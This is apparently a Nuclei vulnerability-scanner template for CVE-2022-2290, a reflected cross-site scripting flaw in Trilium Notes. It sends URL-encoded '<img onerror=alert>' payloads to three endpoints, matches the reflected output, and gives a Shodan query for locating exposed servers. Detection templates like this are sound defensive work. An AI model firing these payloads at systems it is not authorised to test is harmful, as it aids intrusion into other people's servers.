id: CVE-2022-2290
info:
  author: dbrwsky
  classification:
    cve-id: CVE-2022-2290
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: Cross-site Scripting (XSS) - Reflected in GitHub repository zadam/trilium
    prior to 0.52.4, 0.53.1-beta.
  metadata:
    shodan-query: title:"Trilium Notes"
    verified: 'true'
  name: Trilium - Cross-Site Scripting
  reference:
  - https://huntr.dev/bounties/367c5c8d-ad6f-46be-8503-06648ecf09cf/
  - https://github.com/zadam/trilium
  - https://nvd.nist.gov/vuln/detail/CVE-2022-2290
  - https://github.com/zadam/trilium/commit/3faae63b849a1fabc31b823bb7af3a84d32256a7
  severity: medium
  tags: cve,cve2022,xss,trilium
requests:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - No handler matched for custom <img src=x onerror=alert(document.domain)>
    - Note '<img src=x onerror=alert(document.domain)>' not found
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 404
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/custom/%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
  - '{{BaseURL}}/share/api/notes/%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
  - '{{BaseURL}}/share/api/images/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/filename'
  stop-at-first-match: true
